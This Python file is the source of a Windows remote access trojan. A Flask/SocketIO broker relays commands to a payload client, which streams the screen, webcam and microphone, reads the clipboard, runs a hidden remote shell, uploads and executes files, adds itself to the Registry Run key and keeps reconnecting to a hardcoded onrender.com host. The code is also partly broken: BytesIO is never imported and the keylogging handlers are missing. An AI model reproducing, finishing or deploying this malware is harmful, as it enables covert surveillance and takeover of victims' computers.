import os
import sys
import logging
import time
import base64
import json
import threading
import subprocess
import ctypes
import win32api
import win32con
import win32gui
from datetime import datetime
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO, emit, join_room, leave_room

# Configure Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("ControlRoom")

# ============================================================
#  Broker Server (Role: Server)
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'sk-hackerai-supersecret'
# Enable both websocket and polling for maximum compatibility on Render
socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024, async_mode='gevent')

ROOM_TARGET = "target_pc"
ROOM_ADMINS = "admin_browsers"

@app.route('/')
def control_room():
    return render_template('control.html')

@socketio.on('connect')
def handle_connect():
    logger.info(f"New connection attempt: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    # Check if it was the target
    # We can't easily check room membership on disconnect in all versions, 
    # so we'll just broadcast a status check if needed or rely on the next register.
    logger.info(f"Disconnected: {sid}")

@socketio.on('register')
def handle_register(data):
    role = data.get('role')
    sid = request.sid
    if role == 'target':
        join_room(ROOM_TARGET)
        logger.info(f"🔥 TARGET REGISTERED: {sid}")
        socketio.emit('target_status', {'online': True}, room=ROOM_ADMINS)
        # Force an immediate init request from the target
        socketio.emit('request_init', {}, room=ROOM_TARGET) 
    elif role == 'admin':
        join_room(ROOM_ADMINS)
        logger.info(f"👁️ ADMIN REGISTERED: {sid}")
        # When an admin joins, poke the target to start sending data
        socketio.emit('target_status', {'online': True}, to=sid)
        socketio.emit('request_init', {}, room=ROOM_TARGET)

# --- Generic Proxy Logic ---
@socketio.on_error_default
def default_error_handler(e):
    logger.error(f"SocketIO Error: {e}")

def forward_event(event, data, destination_room):
    # Proxy data between rooms
    socketio.emit(event, data, room=destination_room, include_self=False)

# Register Admin -> Target Proxy
ADMIN_EVENTS = [
    'mouse', 'keyboard', 'system', 'terminal_start', 'terminal_input', 'terminal_stop',
    'file_browse', 'file_upload', 'file_delete', 'file_run', 'process_list', 'process_kill',
    'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
    'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send',
    'webcam_start', 'webcam_stop'
]
TARGET_EVENTS = [
    'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
    'file_list', 'file_upload_status', 'file_delete_status', 'process_data', 'process_kill_status',
    'audio_started', 'audio_stopped', 'audio_chunk', 'audio_error', 'vitals_update',
    'monitor_data', 'monitor_switched', 'keylog_data', 'keylog_cleared',
    'clipboard_content', 'clipboard_status', 'chat_received', 'chat_data', 'alert_sent'
]
# --- Direct Event Registration (Unique Names) ---
def create_proxy_handler(ev_name, room_dest):
    def proxy_handler(data=None):
        socketio.emit(ev_name, data, room=room_dest, include_self=False)
    return proxy_handler

for ev in ADMIN_EVENTS:
    socketio.on_event(ev, create_proxy_handler(ev, ROOM_TARGET))

for ev in TARGET_EVENTS:
    socketio.on_event(ev, create_proxy_handler(ev, ROOM_ADMINS))

# ============================================================
#  Payload Client (Role: Client)
# ============================================================
def run_client(master_url):
    logger.info(f"Starting Payload Connection to {master_url}")
    
    try:
        import socketio as client_sio
        import mss
        import cv2
        import numpy as np
        import pyautogui
        import psutil
        import pyperclip
        import winreg
        import ctypes
        from PIL import Image

        # Configure Client Security
        pyautogui.FAILSAFE = False
    except ImportError as e:
        logger.error(f"Missing Library: {e}. Check requirements_windows.txt")
        return

    # Secondary Imports
    try: import sounddevice as sd; AUDIO_READY = True
    except: AUDIO_READY = False
    try: from pynput import keyboard as pynput_keyboard; KEYLOG_READY = True
    except: KEYLOG_READY = False
    try: import GPUtil; GPU_READY = True
    except: GPU_READY = False

    # Connect with both transports allowed
    sio = client_sio.Client(logger=True, engineio_logger=True)

    client_state = { 'capturing': False, 'screen': True, 'webcam': False, 'monitor': 1, 'audio': False, 'term': {}, 'keylog': [] }
    keylog_lock = threading.Lock()

    def capture_loop():
        # High-performance capture using mss and optional resizing
        quality = 30
        resize_factor = 0.8
        with mss.mss() as sct:
            while client_state['capturing']:
                if not client_state['screen']:
                    time.sleep(0.5)
                    continue
                try:
                    monitors = sct.monitors
                    idx = client_state['monitor']
                    if idx >= len(monitors): idx = 1
                    monitor = monitors[idx]
                    
                    img_data = sct.grab(monitor)
                    img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
                    
                    if resize_factor < 1.0:
                        new_size = (int(img.width * resize_factor), int(img.height * resize_factor))
                        img = img.resize(new_size, Image.LANCZOS)
                        
                    buffer = BytesIO()
                    img.save(buffer, format='JPEG', quality=quality, optimize=True)
                    img_b64 = base64.b64encode(buffer.getvalue()).decode()
                    
                    sio.emit('screen_frame', {
                        'image': img_b64,
                        'timestamp': time.time(),
                        'width': monitor['width'],
                        'height': monitor['height']
                    })
                except Exception as ex:
                    logger.debug(f"Capture error: {ex}")
                    time.sleep(0.1)
                time.sleep(0.01)

    @sio.event
    def connect():
        logger.info("CONNECTED to Broker! Authenticating...")
        sio.emit('register', {'role': 'target'})

    @sio.on('request_init')
    def on_request_init(data):
        logger.info("Initializing system metadata for Admin...")
        with mss.mss() as sct:
            sio.emit('init', {
                'screen_size': sct.monitors[client_state['monitor']],
                'status': 'online', 'audio_available': AUDIO_READY,
                'keylogger_available': KEYLOG_READY, 'gpu_available': GPU_READY,
                'monitors': len(sct.monitors) - 1
            })
        client_state['capturing'] = True
        client_state['screen'] = True
        if not any(t.name == "CaptureThread" for t in threading.enumerate()):
            threading.Thread(target=capture_loop, daemon=True, name="CaptureThread").start()

    @sio.on('mouse')
    def on_mouse(data):
        try:
            # Multi-monitor-aware coordinate scaling
            sw = ctypes.windll.user32.GetSystemMetrics(0)
            sh = ctypes.windll.user32.GetSystemMetrics(1)
            
            if data['type'] == 'move':
                abs_x = int(data['x'] * sw)
                abs_y = int(data['y'] * sh)
                win32api.SetCursorPos((abs_x, abs_y))
            elif data['type'] == 'click':
                btn = data.get('button', 'left')
                ev_down = win32con.MOUSEEVENTF_LEFTDOWN if btn == 'left' else win32con.MOUSEEVENTF_RIGHTDOWN
                ev_up = win32con.MOUSEEVENTF_LEFTUP if btn == 'left' else win32con.MOUSEEVENTF_RIGHTUP
                win32api.mouse_event(ev_down, 0, 0, 0, 0)
                time.sleep(0.01)
                win32api.mouse_event(ev_up, 0, 0, 0, 0)
            elif data['type'] == 'dblclick':
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                time.sleep(0.01)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
            elif data['type'] == 'rightclick':
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                time.sleep(0.01)
                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
            elif data['type'] == 'scroll':
                win32api.mouse_event(win32con.MOUSEEVENTF_WHEEL, 0, 0, int(data.get('amount', 0)), 0)
        except Exception as e:
            logger.error(f"Mouse Error: {e}")

    _KEY_MAP = {
        'Control': 'ctrl', 'Shift': 'shift', 'Alt': 'alt', 'Meta': 'win',
        'Enter': 'enter', 'Backspace': 'backspace', 'Delete': 'delete',
        'Tab': 'tab', 'Escape': 'escape', 'CapsLock': 'capslock',
        'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right',
        'Home': 'home', 'End': 'end', 'PageUp': 'pageup', 'PageDown': 'pagedown',
        'Insert': 'insert', ' ': 'space',
    }
    @sio.on('keyboard')
    def on_keyboard(data):
        try:
            k = data['key']
            mapped = _KEY_MAP.get(k, k.lower() if len(k) == 1 else k.lower())
            if data['type'] == 'press': pyautogui.press(mapped)
            elif data['type'] == 'down': pyautogui.keyDown(mapped)
            elif data['type'] == 'up': pyautogui.keyUp(mapped)
            elif data['type'] == 'hotkey': pyautogui.hotkey(*data['keys'])
        except: pass

    @sio.on('terminal_start')
    def on_term_start(data):
        shell = 'powershell.exe' if data.get('shell') == 'powershell' else 'cmd.exe'
        proc = subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000, bufsize=0)
        client_state['term']['p'] = proc
        def read_term():
            while proc.poll() is None:
                try:
                    c = proc.stdout.read(1024)
                    if c: sio.emit('terminal_output', {'output': c.decode('utf-8', errors='replace')})
                except: break
        threading.Thread(target=read_term, daemon=True).start()
        sio.emit('terminal_started', {'shell': data.get('shell')})

    @sio.on('terminal_input')
    def on_term_in(data):
        if 'p' in client_state['term']:
            p = client_state['term']['p']
            if p.poll() is None: 
                try: p.stdin.write((data['input'] + '\n').encode('utf-8')); p.stdin.flush()
                except: pass

    @sio.on('vitals_start')
    def on_vit_start(d):
        client_state['vitals'] = True
        def loop():
            while client_state['vitals']:
                try:
                    mem = psutil.virtual_memory(); disk = psutil.disk_usage('/'); net = psutil.net_io_counters()
                    v = {'cpu': psutil.cpu_percent(), 'ram_percent': mem.percent, 'disk_percent': disk.percent, 'net_sent': round(net.bytes_sent/1e6,1), 'net_recv': round(net.bytes_recv/1e6,1), 'timestamp': time.time()}
                    sio.emit('vitals_update', v)
                except: pass
                time.sleep(1.5)
        threading.Thread(target=loop, daemon=True).start()

    @sio.on('vitals_stop')
    def on_vit_stop(d): client_state['vitals'] = False

    @sio.on('process_list')
    def on_p_list(d):
        ps = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try: ps.append({'pid': p.info['pid'], 'name': p.info['name'], 'cpu': p.info['cpu_percent'] or 0, 'ram': round(p.info['memory_info'].rss/1e6,1)})
            except: pass
        sio.emit('process_data', {'processes': ps[:100]})

    @sio.on('file_browse')
    def on_file_browse(data):
        p = data.get('path', os.path.expanduser('~'))
        try:
            es = []
            for e in os.scandir(p):
                try: es.append({'name': e.name, 'path': e.path.replace('\\','/'), 'is_dir': e.is_dir(), 'size': e.stat().st_size if not e.is_dir() else 0})
                except: pass
            sio.emit('file_list', {'path': p.replace('\\','/'), 'entries': es})
        except Exception as e: sio.emit('file_list', {'error': str(e)})

    @sio.on('file_run')
    def on_file_run(data):
        p = data.get('path')
        if p and os.path.exists(p):
            try:
                # Use os.startfile for Windows to run/open with default handler
                os.startfile(p)
                logger.info(f"Executed file: {p}")
            except Exception as e:
                logger.error(f"Execution error: {e}")

    @sio.on('file_upload')
    def on_file_upload(data):
        try:
            with open(data['path'], 'wb') as f:
                f.write(base64.b64decode(data['content']))
            sio.emit('file_upload_status', {'success': True})
        except Exception as e:
            sio.emit('file_upload_status', {'success': False, 'error': str(e)})

    @sio.on('audio_start')
    def on_audio_start(data):
        if not AUDIO_READY or client_state['audio']: return
        client_state['audio'] = True
        def audio_loop():
            try:
                import sounddevice as sd
                def callback(indata, frames, time, status):
                    if client_state['audio']:
                        sio.emit('audio_chunk', {'data': base64.b64encode(indata).decode('utf-8')})
                with sd.InputStream(callback=callback, channels=1, samplerate=22050):
                    while client_state['audio']: time.sleep(0.1)
            except Exception as e:
                sio.emit('audio_error', {'error': str(e)})
                client_state['audio'] = False
        threading.Thread(target=audio_loop, daemon=True).start()
        sio.emit('audio_started', {})

    @sio.on('monitor_switch')
    def on_mon_switch(data):
        try:
            idx = int(data.get('index', 1))
            client_state['monitor'] = idx
            logger.info(f"Switched to monitor {idx}")
        except: pass

    def webcam_loop():
        while client_state['capturing']:
            if not client_state['webcam']:
                time.sleep(0.5)
                continue
            try:
                import cv2
                cap = cv2.VideoCapture(0)
                while client_state['webcam']:
                    ret, frame = cap.read()
                    if ret:
                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        img_b64 = base64.b64encode(buffer).decode()
                        sio.emit('webcam_frame', {'image': img_b64})
                    time.sleep(0.05)
                cap.release()
            except:
                time.sleep(1)

    @sio.on('webcam_start')
    def on_webcam_start(data):
        client_state['webcam'] = True
        if not any(t.name == "WebcamThread" for t in threading.enumerate()):
            threading.Thread(target=webcam_loop, daemon=True, name="WebcamThread").start()

    @sio.on('webcam_stop')
    def on_webcam_stop(data): client_state['webcam'] = False

    # Persistence & Start
    def persist():
        try:
            key = winreg.HKEY_CURRENT_USER; rpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
            okey = winreg.OpenKey(key, rpath, 0, winreg.KEY_ALL_ACCESS)
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            winreg.SetValueEx(okey, "ControlRoomElite", 0, winreg.REG_SZ, f'"{exe}" "{os.path.abspath(__file__)}"')
            winreg.CloseKey(okey)
        except: pass

    persist()
    while True:
        try: 
            logger.info("Attempting connection...")
            sio.connect(master_url, transports=['websocket', 'polling'])
            sio.wait()
        except Exception as e:
            logger.error(f"Connection failed: {e}. Retrying in 10s...")
            time.sleep(10)

# ============================================================
#  Main Logic
# ============================================================
if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", action="store_true")
    parser.add_argument("--client", action="store_true")
    parser.add_argument("--host", default="https://room-6060.onrender.com")
    args = parser.parse_args()

    is_render = 'RENDER' in os.environ or 'PORT' in os.environ
    if args.server or is_render:
        port = int(os.environ.get('PORT', 8080))
        logger.info(f"Running Broker Server on port {port}")
        socketio.run(app, host='0.0.0.0', port=port, debug=False)
    else:
        logger.info("Running Target Client Mode")
        run_client(args.host)
